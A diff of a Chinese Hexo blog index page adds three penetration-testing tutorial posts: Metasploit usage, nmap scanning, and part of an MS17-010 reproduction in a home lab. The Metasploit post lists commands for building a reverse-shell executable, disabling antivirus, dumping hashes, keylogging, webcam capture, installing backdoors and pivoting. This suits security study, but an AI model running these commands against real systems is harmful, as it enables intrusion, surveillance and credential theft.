@@ -24,9 +24,9 @@
 <meta property="article:tag" content="记录,学习,分享">
 <meta name="twitter:card" content="summary">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
-    <link rel="stylesheet" href="/css/style.css?v=1681535802754">
+    <link rel="stylesheet" href="/css/style.css?v=1681885929857">
     
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681535802754">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681885929857">
 <meta name="generator" content="Hexo 5.4.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -50,7 +50,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>25</div>
+        <div><span>文章</span>28</div>
         <div><span>标签</span>2</div>
         <div><span>分类</span>0</div>
     </div>
@@ -131,6 +131,192 @@
     <div id="nexmoe-content">
         <div class="nexmoe-primary">
             <section class="nexmoe-posts">
+    
+    <div class="nexmoe-post">
+        <a href="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="/assets/background.gif" data-sizes="auto" alt="Metasploit工具使用" class="lazyload">
+                    <h1>Metasploit工具使用</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2023年04月17日</a>
+            <a><i class="nexmoefont icon-areachart"></i>2.5k 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 11 分钟</a>
+        </div>
+
+        <article>
+            
+                <h2 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h2><p>metasploit是一款免费可下载的框架，附带数百个已知的软件漏洞，并保持频繁更新，是渗透领域最流行的框架，在kali中自带。可以使用apt-get install metasploit-framework 来更新或者使用自带的升级命令msfupdate。</p>
+<h2 id="Metasploit模块划分"><a href="#Metasploit模块划分" class="headerlink" title="Metasploit模块划分"></a>Metasploit模块划分</h2><p>msf为总模块，其他均为分支模块，分为以下几个模块：<br>辅助攻击模块：auxiliaary，扫描器，扫描主机系统，寻找可用漏洞<br>渗透攻击模块：exploits，选择配置一个漏洞利用模块<br>攻击载荷模块：payloads，选择并配置一个攻击载荷模块，主要用来建立稳定的连接，可以返回shell和进程注入<br>后渗透攻击模块：post,用于内网渗透的各种操作<br>编码器模块：encoders，选择编码技术绕过杀软或其他免杀方式<br>躲避模块：evasion是msf用来做免杀的效果一般<br>空指令模块：nops，用于提高payload稳定性和维持大小。<br>所有模块位置：/user/share/metasploit-framework/modules/<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-12-34-38.png" alt="模块位置" class="lazyload"></p>
+<h2 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h2><p>首次启动：<br>启动postgresql-&gt;启动metasploit-&gt;连接postgtesql<br>启动步骤：<br>1、启动postgresql：service postgresql start<br>2、初始化msfdb：msfdb init(默认创建的数据库名称： msf，msf_test； 用户名： msf； 密码默认值为空)<br>3、启动msf：msfconsole<br>4、使用db_status可以查看数据库连接状态<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-12-05-59.png" alt="命令执行" class="lazyload"><br>二次启动metasploit直接使用命令msfconsole启动</p>
+<h2 id="渗透步骤exploit"><a href="#渗透步骤exploit" class="headerlink" title="渗透步骤exploit"></a>渗透步骤exploit</h2><ol>
+<li>search xxx #搜索某个漏洞</li>
+<li>use xxx #使用某个漏洞利用模块</li>
+<li>show options(options) #查看配置选项，可以使用info查看详细信息</li>
+<li>set payload #配置攻击载荷</li>
+<li>exploit(run) #执行渗透攻击</li>
+</ol>
+<h2 id="常用命令参数"><a href="#常用命令参数" class="headerlink" title="常用命令参数"></a>常用命令参数</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reload_all #从目录重载所有模块，导入模块也需要使用此命令<br>back #后退命令，移除当前上下文，用于模块切换<br>info #查看模块详细信息<br>check #检查目标是否受某个漏洞影响<br><br>search type:模块类型 path:模块路径 -S 过滤 服务 <br>如：search type:auxiliary -S scanner ssh表示搜索辅助扫描模块的ssh服务<br><br><br>sessions #会话管理<br>sessions -l #列出所有会话<br>sessions -K #终止所有会话<br>sessions -i id #进入某个会话<br>sessions -v #以详细模式列出会话<br>sessions -u #在许多平台上将shell升级到meterpreter会话<br>background 或 bg #将会话放到后台<br><br>show options #显示可选选项<br>     auxiliary #显示所有辅助模块<br>     exploits #显示所有漏洞利用模块<br>     payloads #显示所有有效载荷<br>     targets #显示所有可用目标<br>     advanced #显示高级选项<br>     encoders #显示可用编码器列表<br><br>unset [moudle options] #清楚moudle options<br></code></pre></td></tr></table></figure>
+
+<p>导入模块，模块命名不能有-，可以用_代替。reload_all #从目录重载所有模块。导入模块也需要使用此命令</p>
+<h2 id="辅助模块anxiliary"><a href="#辅助模块anxiliary" class="headerlink" title="辅助模块anxiliary"></a>辅助模块anxiliary</h2><p>使用show可以展示出可以使用的扫描模块有很多<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-13-39-28.png" alt="模块" class="lazyload"><br>使用use 编号可以使用编号对应的模块<br>常用的端口扫描模块</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">use auxiliary/scanner/portmap/portmap_amp<br>use auxiliary/scanner/portscan/ftpbounce<br>use auxiliary/scanner/portscan/tcp<br>use auxiliary/scanner/portscan/ack<br>use auxiliary/scanner/portscan/syn<br>use auxiliary/scanner/portscan/xmas<br></code></pre></td></tr></table></figure>
+
+<p>常用的服务扫描</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">auxiliary/scanner/ssh/ssh_login		<span class="hljs-comment">#SSH爆破</span><br>auxiliary/scanner/vnc/vnc_none_auth	<span class="hljs-comment">#VNC空口令扫描</span><br>auxiliary/scanner/telnet/telnet_login<span class="hljs-comment">#SSH爆破</span><br>auxiliary/scanner/smb/smb_version	<span class="hljs-comment">#SMB系统版本扫描</span><br>auxiliary/scanner/smb/smb_enumusers	<span class="hljs-comment">#SMB枚举</span><br>auxiliary/scanner/smb/smb_login		<span class="hljs-comment">#SMB弱口令登录</span><br>auxiliary/admin/smb/psexec_command	<span class="hljs-comment">#登录SMB且执行命令</span><br><br>auxiliary/scanner/mssql/mssql_ping	<span class="hljs-comment">#MSSQL主机信息扫描</span><br>auxiliary/admin/mssql/mssql_enum	<span class="hljs-comment">#MSSQL枚举</span><br>auxiliary/scanner/mysql/mysql_login	<span class="hljs-comment">#MySQL弱口令扫描</span><br>auxiliary/admin/mysql/mysql_enum	<span class="hljs-comment">#MySQL枚举</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击载荷和编码（payloads-amp-amp-encoders）"><a href="#攻击载荷和编码（payloads-amp-amp-encoders）" class="headerlink" title="攻击载荷和编码（payloads &amp;&amp; encoders）"></a>攻击载荷和编码（payloads &amp;&amp; encoders）</h2><p>可以使用以下方式生成payload和编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">use payload 或标号 -E 强制编码 -e 要使用的模块编码器模块的名称 -f 输出文件名（默认stdout） -t 输出格式：raw，ruby，perl，rb，pl，c，java，dll，exe，elf，vbs，asp，war等 -b要避免的字符列表：&#x27;\x00\xff&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>常用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">windows/meterpreter/bind_tcp 		# 正向连接<br>windows/meterpreter/reverse_tcp 	# 反向连接<br>windows/meterpreter/reverse_http 	# 通过监听80端口反向连接<br>windows/meterpreter/reverse_https 	# 通过监听443端口反向连接<br></code></pre></td></tr></table></figure>
+
+<p>可以使用msfvenom生成shellcode编码免杀<br>msfvenom参数使用详解：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">-l ,--list&lt;type&gt;    #列出所有可用的项目其中值可设为payloads，encoders，nops，platforms，archs，encrypt，formats<br>-p ,--payload &lt;payload&gt;     #指定payload，如果指定为-则从标准输入流中读取<br>--list-options  #列出--payload&lt;payload&gt;的标准，高级和规避选项<br>-f  #指定输出格式 <br>--list-form #列出格式<br>-e  #指定编码方式<br>--list-encoder  #列出编码方式<br>--sec-name &lt;value&gt; #生成windows二进制文件时使用的新名称，默认四个随机数<br>--smallest #使用所有可用的编码器生成最小的payload<br>--encrypt 值 #应用于shellcode的加密或编码类型 (--list encrypt 列出)<br>--encrypt-key 值 #用于加密的密钥<br>--encrypt-iv 值 #加密初始化向量<br>-a，--arch #指定目标系统架构（--list-archs 列出）<br>--platform &lt;platform&gt; #指定目标系统平台（--list-platform）<br>-o #保存payload<br>-b,--bad-chars &lt;list&gt; #设置需要在payload中避免出现的字符<br>-n,--nopsled &lt;length&gt; #指定nop在payload中的数量<br>-s,--space &lt;length&gt; #设置未经编码的payload最大长度<br>--encoder-space &lt;length&gt; #编码后的最大长度<br>-i, --iterations &lt;count&gt; # 设置 Payload 的编码次数<br>-c, --add-code &lt;path&gt; # 指定包含一个额外的win32 shellcode文件<br>-x, --template &lt;path&gt; # 指定一个特定的可执行文件作为模板<br>-k, --keep # 保护模板程序的功能，注入的payload作为一个新的进程运行<br>-v, --var-name &lt;value&gt; # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）<br>-t, --timeout &lt;second&gt; # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）<br>-h, --help # 帮助 <br></code></pre></td></tr></table></figure>
+
+<p>windows</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kali的 ip LPORT=kali监听端口 -f exe &gt;1.exe<br>参数选项：<br>-p 指定payload<br>-a 自定系统架构<br>-e 编码器，x86/shikata_ga_nai<br>-i 迭代器，对有效载荷的编码次数<br>-f 输出文件格式：exe，dll，raw<br>-o 指定文件名输出文件<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-15-09-05.png" alt="生成" class="lazyload"></p>
+<p>linux<br><code>msfvenom -p payload LHOST=kali ip LPORT=kali监听端口 -f 文件格式&gt;文件名</code></p>
+<p>常见生成：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-51-10.png" alt="常见生成shellcode" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-52-57.png" alt="常见格式" class="lazyload"></p>
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>木马绕过免杀的本质是更改特征码方式有以下几种：编码、加壳免杀、二次编译、分离免杀：即将shellcode和加载器分离。目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。<br>互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。</p>
+<h2 id="监听反弹shell"><a href="#监听反弹shell" class="headerlink" title="监听反弹shell"></a>监听反弹shell</h2><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">use exploit/multi/handler 使用这个监听模块<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="hljs-comment">#注意这要和生成的木马保持一致</span><br><span class="hljs-built_in">set</span> lhost kali的ip <span class="hljs-comment">#设置本地地址要和木马一致</span><br><span class="hljs-built_in">set</span> lport 端口号 <span class="hljs-comment">#设置本地侦听端口和木马一致</span><br>run <span class="hljs-comment">#执行</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-15-23-53.png" alt="kali侦听" class="lazyload"><br>最重要的payload设置<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-28-24.png" alt="设置payload" class="lazyload"><br>将生成的木马1.exe上传到win7然后执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-29-17.png" alt="运行" class="lazyload"><br>kali的msf后台上线，进入shell了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-29-58.png" alt="上线" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-33-03.png" alt="测试是否成功" class="lazyload"></p>
+<h2 id="后渗透模块（post）"><a href="#后渗透模块（post）" class="headerlink" title="后渗透模块（post）"></a>后渗透模块（post）</h2><p>以下命令是在反弹shell成功后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">run post/windows/gather/checkvm #检查目标是否虚拟机<br>run post/linux/gather/checkvm<br>run post/windows/manage/killav #关闭杀软<br>run post/windows/manage/enable_rdp #开启目标远程桌面<br>run post/windows/gather/enum_logged_on_users #列举当前登陆用户，和最近登陆过的用户<br>run post/windows/gather/enum_applications #列举应用程序<br>run windows/gather/credentials/windows_autologin#列举自动登陆的用户名和密码<br></code></pre></td></tr></table></figure>
+
+<p>运行测试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-38-53.png" alt="查看" class="lazyload"></p>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p><strong>持久化</strong><br>刚才刚刚获得的meterpreter shell，该shell是非常脆弱的，可以把它和目标机中一个稳定的程序绑定，NT AUTHORITY\SYSTEM 这个账号是隐藏的就是windows至高权限账户，根administrator拥有相同权限：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">getpid <span class="hljs-comment">#查看当前meterpreter shell的进程号</span><br>ps <span class="hljs-comment">#获取目标进程</span><br>migrate 进程号 <span class="hljs-comment">#将shell迁移到pid为进程号的进程中</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-48-07.png" alt="持久化" class="lazyload"></p>
+<p>常用命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">pwd</span>、ls、<span class="hljs-built_in">cd</span><br>getuid		<span class="hljs-comment">#查看当前权限</span><br>getsystem	<span class="hljs-comment">#获得系统管理员权限（要本地管理员权限运行）</span><br>hashdump	<span class="hljs-comment">#抓哈希密码</span><br>sysinfo		<span class="hljs-comment">#查看系统信息</span><br>idletim     <span class="hljs-comment">#查看目标系统已运行时间</span><br>route		<span class="hljs-comment">#查看目标机完整网络设置</span><br>shell		<span class="hljs-comment">#进入目标机shell，exit退出she</span><br>background	<span class="hljs-comment">#将meterpreter隐藏在后台</span><br><br>upload ./1.txt c:\\1.txt		<span class="hljs-comment">#上传文件</span><br>download c:\1.txt ./			<span class="hljs-comment">#下载文件</span><br>search -f *.txt -d c://			<span class="hljs-comment">#搜索文件</span><br><br>keyscan_start	<span class="hljs-comment">#启动键盘记录</span><br>keyscan_stop	<span class="hljs-comment">#停止键盘记录</span><br>keyscan_dump	<span class="hljs-comment">#转储键盘记录的内容</span><br>screenshot		<span class="hljs-comment">#抓取截屏</span><br>webcam_list		<span class="hljs-comment">#摄像头列表</span><br>webcam_snap		<span class="hljs-comment">#摄像头拍照</span><br>webcam_stream	<span class="hljs-comment">#抓取视频</span><br><br><span class="hljs-comment">#Kali-Linux下登录远程桌面</span><br>sudo rdesktop -f 目标IP<br><br>route add IP 子网掩码    <span class="hljs-comment">#添加路由，先background</span><br></code></pre></td></tr></table></figure>
+
+<p>在这里可以使用persistence模块留后门,也就是建立持续性后门。<br>persistence是用来进行权限维持的，可以利用它创建注册表和文件，这个模块是我们获取了meterpreter shell后使用<br>我们可以查看persistence查看帮助信息通过<code>run persistence -h</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-12-33-32.png" alt="查看" class="lazyload"><br>这里报错暂时没有解决。</p>
+<p>也可以使用metsvc生成后门<code>run metsvc -h</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-31-15.png" alt="后门" class="lazyload"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">-A   安装后门后，自动启动exploit/multi/handler模块连接后门<br>-h  查看帮助<br>-r  删除后门<br></code></pre></td></tr></table></figure>
+
+<p>安装成功后会在c:\windows\temp中创建一个新目录上传metsvc.dll、metsvc-server.exe、metsvc.exe<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-34-00.png" alt="生成后门" class="lazyload"><br>我们打开新的msf使用handler连接，这里需要注意生成的payload已经改变我们需要重新配置为<code>set payload windows/metsvc_bind_tcp</code><br>查看配置这里我们需要指定远程地址为win7地址远程端口号为31337这里是一个正向连接的shell<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-45-02.png" alt="配置" class="lazyload"><br>执行run<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-52-44.png" alt="执行" class="lazyload"><br>不知什么原因死了</p>
+<h2 id="网络穿透"><a href="#网络穿透" class="headerlink" title="网络穿透"></a>网络穿透</h2><p>拿到反向shell之后获取目标网络信息<br><code>run get_local_subnets</code></p>
+<p>使用autoroute模块添加路由</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">run autoroute -s 192.168.23.0/225.225.225.0<br>run autoroute -p <span class="hljs-comment">#列出添加了路由规则存活的session</span><br></code></pre></td></tr></table></figure>
+
+<p>添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了</p>
+
+            
+        </article>
+    </div>
+    
+    <div class="nexmoe-post">
+        <a href="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="/assets/background.gif" data-sizes="auto" alt="nmap扫描工具" class="lazyload">
+                    <h1>nmap扫描工具</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2023年04月16日</a>
+            <a><i class="nexmoefont icon-areachart"></i>929 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+        </div>
+
+        <article>
+            
+                <h2 id="Nmap简介"><a href="#Nmap简介" class="headerlink" title="Nmap简介"></a>Nmap简介</h2><p>端口扫描是nmap工具的核心功能，用于确定目标主机tcp/udp端口开放情况。在kali中已经安装。<br>默认情况下nmap会扫描最有可能开放的tcp端口<br>nmap通过探测将端口划分为6个状态：</p>
+<ol>
+<li>open端口是开放的</li>
+<li>closed端口是关闭的</li>
+<li>filtered端口被firewall/ids/ips屏蔽，无法确定状态</li>
+<li>unfiltered端口没有被屏蔽，但是否开放无法确定</li>
+<li>open|filtered端口是开放或屏蔽</li>
+<li>closed|filtered端口是关闭或屏蔽</li>
+</ol>
+<h2 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h2><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-11-43-45.png" alt="常用" class="lazyload"><br>nmap有四种基本功能：端口扫描、主机探测、服务识别和系统识别</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><figcaption><span>地址```默认扫描主机的1000个常用端口</span></figcaption><table><tr><td class="code"><pre><code class="hljs nmap">![扫描](nmap扫描工具/2023-04-16-11-53-56.png)<br>可以看到扫描了1000个端口并把开放的端口和能识别的服务显示出来了。<br><br>* 指定端口<br>使用-p参数可以一次扫描单个、多个、或扫描一个范围的端口<br><br>```txt<br>nmap 地址 -p 端口号 #扫描单个端口<br>nmap 地址 -p 1-80 #扫描端口范围<br>nmap 地址 -p 80,3389,23,22 #扫描多个端口<br>nmap 地址 -p- 等价于nmap 地址 -p 1-65535 #扫描全端口<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-02-37.png" alt="指定端口扫描" class="lazyload"></p>
+<ul>
+<li><p>指定扫描方式<br>利用wireshark过滤扫描时的请求包筛选出指定方式的请求例如扫描地址并且端口是tcp的80如下图<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-12-44.png" alt="指定方式扫描" class="lazyload"></p>
+</li>
+<li><p>tcp全连接扫描<br>使用-sT参数进行tcp全连接扫描（全连接扫描指的是建立完整的三次握手，能够建立则说明端口开放，否则判定端口关闭）<br><code>nmap 地址 -p 80 -sT</code><br>如果端口开放就会进行完整的三次握手成功建立连接扫描结果中的state字段为open<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-44-58.png" alt="全连接" class="lazyload"></p>
+</li>
+</ul>
+<p>如果端口关闭则只进行一次握手无法建立连接扫描结果中的state字段为closed<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-46-12.png" alt="端口关闭" class="lazyload"></p>
+<ul>
+<li>syn半连接扫描<br>使用-sS参数进行syn半连接扫描（半连接指的是只进行两次握手，对方返回确认帧ack=1说明端口开放否则端口关闭）<br><code>nmap 地址 -p 80 -sS</code><br>如果端口开放则会完成两次握手，扫描结果中的state字段为open<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-26-24.png" alt="完整扫描" class="lazyload"></li>
+</ul>
+<p>如果端口关闭则，只能进行一次握手，扫描结果state字段显示closed<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-30-25.png" alt="端口没有开放" class="lazyload"><br>这里没有进行-sS参数添加是因为nmap默认使用半连接扫描</p>
+<p>全连接和半连接<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-52-55.png" alt="比较" class="lazyload"></p>
+<ul>
+<li>隐秘扫描只适用于linux系统<br>隐秘扫描是向目标主机的端口发送tcp fin包或xmas tree包或null包，如果收到rst响应包则判定端口关闭否则就判定端口开放或屏蔽</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">nmap 127.0.0.1 -p 80 -sF #fin扫描<br>nmap 127.0.0.1 -p 80 -sN #null扫描所有loges都为0的tcp包<br>nmap 127.0.0.1 -p 80 -sX #xmas扫描flags的fin、urg、pysh都为1<br></code></pre></td></tr></table></figure>
+
+<h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>扫描网段中有那些主机在线，使用-sP参数，不扫描端口只扫描存活主机<br>本质上是使用ping扫描，能ping同有回包则判定主机在线<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-02-22.png" alt="扫描主机" class="lazyload"><br>可以看到扫描了192.168.23.0这个网段的256个ip其中有5个存活</p>
+<h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><p>扫描端口时，默认显示端口对应的服务，但不显示服务版本，可以使用-sV参数显示服务版本<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-06-28.png" alt="显示服务版本" class="lazyload"></p>
+<h3 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h3><p>可以使用-O参数识别操作系统版本，这里扫描的结果可能不准确，识别不出来会以概率列举操作系统<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-09-05.png" alt="识别操作系统" class="lazyload"></p>
+<h3 id="扫描结果导出"><a href="#扫描结果导出" class="headerlink" title="扫描结果导出"></a>扫描结果导出</h3><p>可以导出扫描结果使用-oN导出为文本格式，-oX导出为xml格式<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-15-41.png" alt="导出" class="lazyload"></p>
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>-T &lt;0-5&gt;参数指定扫描速度，常用4</p>
+
+            
+        </article>
+    </div>
+    
+    <div class="nexmoe-post">
+        <a href="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="/assets/background.gif" data-sizes="auto" alt="永恒之蓝漏洞复现（ms17-010）" class="lazyload">
+                    <h1>永恒之蓝漏洞复现（ms17-010）</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2023年04月15日</a>
+            <a><i class="nexmoefont icon-areachart"></i>875 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+        </div>
+
+        <article>
+            
+                <h2 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h2><p>metasploit framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知软件漏洞，并保持持续更新，metaspolit可以用来信息搜集、漏洞探测、漏洞利用等渗透测试的全流程，在kali中自带了。</p>
+<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>基础命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">进入msf</span><br>msfconsole<br><span class="hljs-meta">#</span><span class="bash">使用search查找相关漏洞</span><br>search ms17-010<br><span class="hljs-meta">#</span><span class="bash">使用use进入模块</span><br>use 数字<br><span class="hljs-meta">#</span><span class="bash">使用info查看模块xinxi</span><br>info<br><span class="hljs-meta">#</span><span class="bash">设置poc连接方式</span><br>set payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-meta">#</span><span class="bash">查看模块需要配置的参数</span><br>show options<br><span class="hljs-meta">#</span><span class="bash">设置参数</span><br>set RHOST 地址<br><span class="hljs-meta">#</span><span class="bash">攻击</span><br>exploit / run<br><span class="hljs-meta">#</span><span class="bash">回退</span><br>back<br><br></code></pre></td></tr></table></figure>
+
+<p>后渗透命令</p>
